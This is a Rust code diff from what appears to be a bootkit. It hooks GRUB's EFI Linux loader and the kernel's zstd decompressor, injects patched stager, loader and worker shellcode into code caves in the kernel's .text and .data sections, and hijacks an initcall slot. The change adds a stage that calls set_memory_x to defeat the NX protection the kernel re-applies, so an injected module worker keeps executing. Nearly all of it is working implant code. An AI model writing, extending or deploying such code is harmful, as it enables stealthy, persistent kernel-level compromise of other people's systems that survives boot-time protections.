@@ -1,7 +1,7 @@
 use log::{debug, error, info};
 
 use crate::helpers::{
-    file_helper::cave_finder_by_section_name,
+    file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_after},
     memory_helper::{
         INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
         get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
@@ -36,6 +36,10 @@ const MSLEEP_PATTERN: &[u8] = &[0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 
 const MSLEEP_DISTANCE: u8 = 0x1E;
 const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
 const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
+const LKM_WORKER_REL_SENTINEL: u32 = 0xFEDCBA98;
+const WORKER_RESUME_SENTINEL: u32 = 0x11EEDDFF;
+// Offset of lkm_worker from the start of the loader blob (set by align 128 in lkm_loader.asm).
+const LKM_WORKER_IN_LOADER_OFFSET: usize = 128;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -210,14 +214,19 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         initcall_info.original_target_virtual_address
     );
 
-    // Stage 1 — stager (41 bytes) lives in .text (always RX).
-    // Stage 2 — loader lives in .data (initially RW; stager calls set_memory_x first).
+    // Stage 1 — stager lives in .text (always RX): makes .data cave executable, jumps to loader.
+    // Stage 2 — loader lives in .data: initialises work_struct, calls schedule_work.
+    // Stage 3 — worker_resume lives in .text (always RX): re-enables .data execution, jumps to lkm_worker.
+    // Stage 4 — lkm_worker lives in .data (inside loader blob at offset LKM_WORKER_IN_LOADER_OFFSET).
+    //            mark_readonly() re-applies NX to .data after initcalls; worker_resume fixes this.
     const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
     const STAGER_LEN: usize = STAGER_TEMPLATE.len();
     const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
     const LOADER_LEN: usize = LOADER_TEMPLATE.len();
+    const WORKER_RESUME_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_RESUME_BIN"));
+    const WORKER_RESUME_LEN: usize = WORKER_RESUME_TEMPLATE.len();
 
-    // Find stager cave in .text (STAGER_LEN + 15 bytes for 16-byte alignment headroom).
+    // Find stager cave in .text.
     let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
         Some(addr) => addr,
         None => {
@@ -225,11 +234,25 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             return ret_val;
         }
     };
-    // let stager_cave = (stager_cave + 15) & !15;
-    // debug!("Stager cave: phys={:#x} (aligned)", stager_cave);
     debug!("Stager cave: phys={:#x}", stager_cave);
 
-    // Find loader cave in .data (LOADER_LEN + 15 bytes for alignment headroom).
+    // Find worker_resume cave in .text — must be after the stager cave.
+    let worker_resume_cave = match cave_finder_by_section_name_after(
+        dst,
+        dst_capacity,
+        WORKER_RESUME_LEN,
+        ".text",
+        stager_cave + STAGER_LEN,
+    ) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find worker_resume cave in .text");
+            return ret_val;
+        }
+    };
+    debug!("Worker resume cave: phys={:#x}", worker_resume_cave);
+
+    // Find loader cave in .data.
     let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
         Some(addr) => addr,
         None => {
@@ -237,7 +260,6 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
             return ret_val;
         }
     };
-    // let loader_cave = (loader_cave + 15) & !15;
     debug!("Loader cave: phys={:#x}", loader_cave);
 
     // Find __request_module via byte pattern.
@@ -339,6 +361,19 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         stager_cave, stager_cave_virt
     );
 
+    let worker_resume_cave_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, worker_resume_cave) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to translate worker_resume cave to virtual address");
+                return ret_val;
+            }
+        };
+    debug!(
+        "Worker resume cave: phys={:#x}, virt={:#x}",
+        worker_resume_cave, worker_resume_cave_virt
+    );
+
     let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
         Some(addr) => addr,
         None => {
@@ -350,6 +385,9 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         "Loader cave: phys={:#x}, virt={:#x}",
         loader_cave, loader_cave_virt
     );
+
+    // lkm_worker is at a fixed offset inside the loader blob (set by align 128 in lkm_loader.asm).
+    let lkm_worker_virt = loader_cave_virt + LKM_WORKER_IN_LOADER_OFFSET;
 
     // ── Patch stager blob ──────────────────────────────────────────────────────
     let mut stager = [0u8; STAGER_LEN];
@@ -426,7 +464,7 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         return ret_val;
     }
 
-    // ── Write both blobs ───────────────────────────────────────────────────────
+    // ── Patch loader blob ──────────────────────────────────────────────────────
     let sentinel = SCHEDULE_WORK_REL_SENTINEL.to_le_bytes();
     if let Some(off) = find_sentinel_4(&loader, &sentinel) {
         let rel32 =
@@ -460,13 +498,96 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         return ret_val;
     }
 
+    // WORKER_RESUME_SENTINEL: disp32 in `lea rax, [rip + disp32]` — points to
+    // lkm_worker_resume in .text so that work.func runs from an always-executable page.
+    let sentinel = WORKER_RESUME_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let disp32 =
+            (worker_resume_cave_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "worker_resume cave too far from loader for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find WORKER_RESUME_SENTINEL in loader");
+        return ret_val;
+    }
+
+    // ── Patch worker_resume blob ───────────────────────────────────────────────
+    let mut worker_resume = [0u8; WORKER_RESUME_LEN];
+    worker_resume.copy_from_slice(WORKER_RESUME_TEMPLATE);
+
+    // CAVE_PAGE_DISP_SENTINEL: disp32 in lea rdi,[rip+d] → loader_cave_virt
+    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
+        let disp32 =
+            (loader_cave_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!(
+                "Loader cave too far from worker_resume for disp32: delta={:#x}",
+                disp32
+            );
+            return ret_val;
+        }
+        worker_resume[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in worker_resume");
+        return ret_val;
+    }
+
+    // SET_MEMORY_X_REL_SENTINEL: rel32 for call set_memory_x
+    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
+        let rel32 =
+            (set_memory_x_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!(
+                "set_memory_x too far from worker_resume for rel32: delta={:#x}",
+                rel32
+            );
+            return ret_val;
+        }
+        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in worker_resume");
+        return ret_val;
+    }
+
+    // LKM_WORKER_REL_SENTINEL: rel32 for jmp lkm_worker in .data
+    let sentinel = LKM_WORKER_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&worker_resume, &sentinel) {
+        let rel32 =
+            (lkm_worker_virt as i64) - (worker_resume_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!(
+                "lkm_worker too far from worker_resume for rel32: delta={:#x}",
+                rel32
+            );
+            return ret_val;
+        }
+        worker_resume[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
+    } else {
+        error!("Failed to find LKM_WORKER_REL_SENTINEL in worker_resume");
+        return ret_val;
+    }
+
+    // ── Write all three blobs ──────────────────────────────────────────────────
     unsafe {
         core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
         core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
+        core::ptr::copy_nonoverlapping(
+            worker_resume.as_ptr(),
+            worker_resume_cave as *mut u8,
+            WORKER_RESUME_LEN,
+        );
     }
     debug!(
-        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}",
-        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave
+        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}, {} bytes of worker_resume to {:#x}",
+        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave, WORKER_RESUME_LEN, worker_resume_cave
     );
 
     // ── Patch initcall slot (prel32) to point at the stager ────────────────────
